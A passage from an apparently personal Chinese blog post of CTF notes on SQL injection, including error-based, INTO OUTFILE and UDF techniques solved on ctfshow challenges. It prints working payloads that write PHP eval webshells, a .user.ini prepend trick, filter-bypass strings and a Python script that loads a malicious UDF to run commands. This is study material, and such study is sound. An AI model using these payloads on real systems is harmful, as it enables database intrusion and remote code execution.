<h2 id="报错注入法-1"><a href="#报错注入法-1" class="headerlink" title="报错注入法"></a>报错注入法</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以用来爆出数据库的名称</p>
<p><code>floor(rand(0)*2)</code>产生的随机数前6位一定是 0 1 1 0 1 1<br><code>concat()</code>用于将字符串连接<br><code>concat(database(),floor(rand(0)*2))</code>生成<code>database()+&quot;0&quot;或database()+&quot;1&quot;</code>的数列，而前六位的顺序一定是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"0"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"0"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>报错具体过程：</p>
<ol>
<li>建立临时表</li>
<li>取第一条记录，执行<code>concat(database(),floor(rand(0)*2))</code>（第一次执行），结果为<code>database()+“0”</code>，查询临时表，发现<code>database()+&quot;0&quot;</code>这个主键不存在，则准备执行插入，此时又会在执行一次<code>concat(database(),floor(rand(0)*2))</code>（第二次执行），结果是<code>database()+“1”</code>，然后将该值作为主键插入到临时表。（真正插入到临时表中的主键是<code>database()+“1”，concat(database(),floor(rand(0)2))</code> 执行了两次）</li>
<li>取第二条记录，执行<code>concat(database(),floor(rand(0)2))</code>（第三次执行），结果为<code>database+“1”</code>，查询临时表，发现该主键存在，<code>count(*)</code>的值加1</li>
<li>取第三条记录，执行<code>concat(database(),floor(rand(0)*2))</code>（第四次执行），结果为<code>database()+“0”</code>，查询临时表发现该主键不存在，则准备执行插入动作，此时又会在执行一次<code>concat(database(),floor(rand(0)*2))</code>（第五次执行），结果是<code>database()+“1”</code>，然后将该值作为主键插入到临时表。但由于临时表已经存在<code>database()+&quot;1&quot;</code>这个主键，就会爆出主键重复，同时也带出了数据库名</li>
</ol>
<p>注：由以上过程可以发现，总共取了三条记录，所以表中的数据至少要为三条才可以注入成功</p>
<hr>
<h1 id="finfo文件注入"><a href="#finfo文件注入" class="headerlink" title="finfo文件注入"></a>finfo文件注入</h1><h2 id="finfo类"><a href="#finfo类" class="headerlink" title="finfo类"></a>finfo类</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.finfo-file.php">官方文档</a></p>
<p>其中有方法<code>open</code>，<code>file</code></p>
<p>finfo_open：也就是finfo::open的别名，这个函数的作用是打开一个文件，通常和<code>finfo::file/finfo_file</code>在一起使用</p>
<p>finfo_file：返回一个文件的信息</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 等价</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_NONE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815122316952.png" alt="image-20230815122316952"></p>
<p>那么只要我们精心构造上传文件的内容，闭合前面的语句来执行sql创建文件的语句，就能实现写入一句话木马getshell</p>
<blockquote>
<p>ctfshow web224</p>
</blockquote>
<p>扫出robots.txt，访问&#x2F;pwdreset.php重置密码为admin，登录进入上传界面</p>
<p>而我们要做的是通过写入一句话木马getshell，而常见的图片后缀都被过滤了，这里需要上传bin文件才能实现我们的目的</p>
<p>关键payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">');select 0x3c3f3d60245f4745545b315d603f3e into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php'<span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815123504087.png" alt="image-20230815123504087"></p>
<p>这样直接上传是不会解析执行的，所以我们还需要添加脏字符使其执行</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815124429198.png" alt="image-20230815124429198"></p>
<p>然后就能成功写入一句话木马</p>
<hr>
<h1 id="file注入"><a href="#file注入" class="headerlink" title="file注入"></a>file注入</h1><p>存在<code>into outfile</code>函数上传文件时，如果存在注入点，可以导入一句话或者上传页面</p>
<blockquote>
<p>ctfshow web242</p>
</blockquote>
<p>原型语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先看一下<code>into outfile</code>函数有什么参数（图 from Boogipop）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/tmp/result.txt'</span>
<span class="token keyword">FIELDS</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">','</span> <span class="token keyword">OPTIONALLY</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'"'</span>
<span class="token keyword">LINES</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'\n'</span>
<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819164443843.png" alt="image-20230819164443843"></p>
<p><code>starting by</code>是每行开始，<code>terminated by</code>是每行结束</p>
<p><code>LINES TERMINATED BY</code>：结束后添加一个语句，也就是字段间的间隔符</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819171334845.png" alt="image-20230819171334845"></p>
<p><code>OPTIONALLY ENCLOSED BY</code>：要和<code>LINES TERMINATED BY</code>一起使用，将字段用什么包裹起来</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819171550805.png" alt="image-20230819171550805"></p>
<p>到这里我们就知道可以插入一句话木马来实现getshell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">1.</span>php<span class="token string">' FIELDS TERMINATED BY '</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819172200713.png" alt="image-20230819172200713"></p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819172257315.png" alt="image-20230819172257315"></p>
<h2 id="user-ini和短标签绕过"><a href="#user-ini和短标签绕过" class="headerlink" title=".user.ini和短标签绕过"></a>.user.ini和短标签绕过</h2><blockquote>
<p>ctfshow web243</p>
</blockquote>
<p>过滤php的情况下，就按照文件上传的几个trick来打就行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">1.</span>txt<span class="token string">' FIELDS TERMINATED BY '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为.user.ini是配置文件，所以我们可以构造<code>;</code>和换行符<code>%0a</code>来注释多余字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>ini<span class="token string">' lines starting by'</span><span class="token punctuation">;</span><span class="token string">' terminated by '</span><span class="token operator">%</span><span class="token number">0</span>aauto_prepend_file<span class="token operator">=</span><span class="token number">1.</span>txt'<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>




<hr>
<h1 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h1><p>参考<a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BQuine%E6%B3%A8%E5%85%A5.html">ph0ebus大佬的博客</a></p>
<blockquote>
<p>自产生程序，不接受输入并输出自己的源代码</p>
</blockquote>
<p>在sql注入中，就是让输入的sql语句与要输出的一致</p>
<p>要实现输入语句与输出语句一致，那就需要用到<code>replace</code>函数进行重复替换</p>
<p>基本形式</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">replace</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中参数str的形式为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">replace</span><span class="token punctuation">(</span>间隔符<span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span>间隔符<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>例：间隔符为”<code>.</code>“，编码间隔符为<code>CHAR(46)</code>，这样str就是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230624184640501.png" alt="image-20230624184640501"></p>
<p>构造出来的结果就是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">'REPLACE(".",CHAR(46),".")'</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'REPLACE(".",CHAR(46),".")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230624185624959.png" alt="image-20230624185624959"></p>
<p>但是此时可以发现单双引号还没实现一致</p>
<p>这时候就需要使用<code>REPLACE</code>将<code>str</code>的双引号换成单引号，这样最后就不会出现引号不一致的情况了</p>
<p>因此升级版Quine的基本形式，<code>CHAR(34)</code>是双引号，<code>CHAR(39)</code>是单引号</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span><span class="token string">'str'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>升级版str的基本形式</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">"间隔符"</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span><span class="token string">"间隔符"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>先将str里的双引号替换成单引号，再用str替换str里的间隔符</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'replace(replace(".",char(34),char(39)),char(46),".")'</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'replace(replace(".",char(34),char(39)),char(46),".")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230624205209275.png" alt="image-20230624205209275"></p>
<hr>
<h1 id="UDF注入"><a href="#UDF注入" class="headerlink" title="UDF注入"></a>UDF注入</h1><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#UDF-%E6%8F%90%E6%9D%83">参考国光大佬的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125220318?ops_request_misc=&request_id=4ebaa5cb9e74494eb60062c40617ff22&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-3-125220318-null-null.268%5Ev1%5Econtrol&utm_term=sql&spm=1018.2226.3001.4450">参考羽师傅的博客</a></p>
<p>udf 全称为：user defined function，意为用户自定义函数</p>
<p>用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 <code>contact()</code>，<code>user()</code>，<code>version()</code>等函数</p>
<p>写入位置：<code>/usr/lib/MySQL目录/plugin</code></p>
<p>具体步骤：</p>
<ol>
<li><p>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib&#x2F;plugin文件夹下），udf文件可以从sqlmap里面扒，也可以在国光的博客里面扒<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a>，一般选lib_mysqludf_sys_64.so就可以了</p>
</li>
<li><p>从udf文件中引入自定义函数(user defined function)</p>
</li>
<li><p>执行自定义函数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'hack.so'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<blockquote>
<p>ctfshow web248</p>
</blockquote>
<p>因为get请求有长度限制，所以这里得分段来传</p>
<p>把国光博客里的payload中0x后面的16进制值填到下面脚本的udf变量中就可以了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://17c12732-3a13-4af4-8750-f614f00d0519.challenge.ctf.show/api/"</span>
udf<span class="token operator">=</span><span class="token string">""</span>
udfs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>udf<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    udfs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#写入多个文件中</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> udfs<span class="token punctuation">:</span>
    url1<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"?id=1';SELECT '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">' into dumpfile '/tmp/"</span></span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>udfs<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">".txt'%23"</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>

<span class="token comment">#合并文件生成so文件</span>
url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?id=1';SELECT unhex(concat(load_file('/tmp/0.txt'),load_file('/tmp/1.txt'),load_file('/tmp/2.txt'),load_file('/tmp/3.txt'))) into dumpfile '/usr/lib/mariadb/plugin/hack.so'%23"</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>

<span class="token comment">#创建自定义函数并执行恶意命令</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?id=1';create function sys_eval returns string soname 'hack.so'%23"</span><span class="token punctuation">)</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?id=1';select sys_eval('cat /f*')%23"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h1><h2 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h2><p>使用截断函数</p>
<ul>
<li><strong>substr()函数</strong></li>
</ul>
<p>​	  <code>substr(string,start,length)</code></p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20221207161642898.png" alt="1"></p>
<ul>
<li><p><strong>left()函数</strong></p>
<p>获得源字符串左边的子串</p>
<p><code>left(string,n)</code></p>
</li>
<li><p><strong>right()函数</strong></p>
<p>获得字符串右边的子串</p>
<p><code>right(string,n)</code></p>
</li>
<li><p><strong>mid()函数</strong></p>
<p>返回字符串的子串（类似substr）</p>
<p><code>mid(string,start,length)</code></p>
</li>
<li><p><strong>reverse()函数</strong></p>
</li>
</ul>
<hr>
<h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><ol>
<li><p>空格：<code>/**/</code>、<code>%09</code>、<code>%0a</code>、<code>%0d</code>、<code>%0c</code>、<code>+</code></p>
<p>以上全部过滤：直接用括号或反引号闭合</p>
<p>如<code>-1&#39;||column_name=&#39;flag</code>或<code>-1&#39;or(username)=&#39;flag</code></p>
</li>
<li><p>等号：like</p>
</li>
<li><p>单独select: 大写</p>
</li>
<li><p>select…where…：</p>
<ul>
<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
</li>
<li><p>将 select * from 列名 进行16进制编码</p>
</li>
<li><p><strong>handler</strong>:一行一行显示库中内容</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815205244766.png" alt="image-20230815205244766"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> table_name <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span>为新创建的表<span class="token punctuation">)</span>
<span class="token keyword">handler</span> table_name <span class="token keyword">read</span><span class="token punctuation">;</span>读出什么输出什么

<span class="token keyword">handler</span> tablename <span class="token keyword">read</span> <span class="token keyword">first</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ol>
<ul>
<li><p>单字段过滤：16进制编码<code>hex(a.username)</code></p>
</li>
<li><p>过滤payload中的引号：</p>
<p><code>unhex()</code>和<code>hex()</code>组合绕过</p>
<p>‘abc’ 等价于<code>unhex(hex(6e6+382179))</code>; 可以用于绕过大数过滤（大数过滤：<code>/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i</code>）<br>具体转换的步骤是：</p>
<ol>
<li>abc转成16进制是616263</li>
<li>616263转十进制是6382179</li>
<li>用科学计数法表示6e6+382179 </li>
<li>套上unhex(hex())，就是unhex(hex(6e6+382179));</li>
</ol>
</li>
<li><p>过滤数字：</p>
<p>用别的字符替换数字然后再转换回去</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'</span><span class="token number">1</span><span class="token string">','</span>arc<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>brc<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>crc<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>drc<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>erc<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>frc<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>grc<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>hrc<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>irc<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>jrc<span class="token string">'),'</span>a<span class="token string">' from table_name where username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">'flag'</span>
<span class="token comment">#flag表示number</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'arc'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'brc'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'crc'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'drc'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'erc'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'frc'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'grc'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'hrc'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'irc'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'jrc'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>过滤ASCll码<code>/[\x00-\x7f]/i</code>：</p>
<p>文件包含</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' union select 1,group_concat(password) from table_name into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt<span class="token string">'-- -
将flag写入1.txt文件中

-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span>'<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php
写入一句话木马<span class="token punctuation">(</span>需用base64编码<span class="token operator">+</span>from_base64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
在<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>api<span class="token operator">/</span>config<span class="token punctuation">.</span>php找到mysql的root的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<hr>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-mysql-prepared-statements.html">MySQL预处理</a></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
            </transition>
            
            <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
            </transition>
            
        </div>
        <script src="/blog/js/main.js"></script>
        
        




         
        
    <div id="vcomments"></div>
    
        <script src="/blog/js/lib/valine.min.js"></script>
            <script>
                new Valine({
                    el: '#vcomments',
                    appId: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
                    appKey: 'SzWOnY0PWLGNuL6jW8TZYc7j',
                });
            </script>

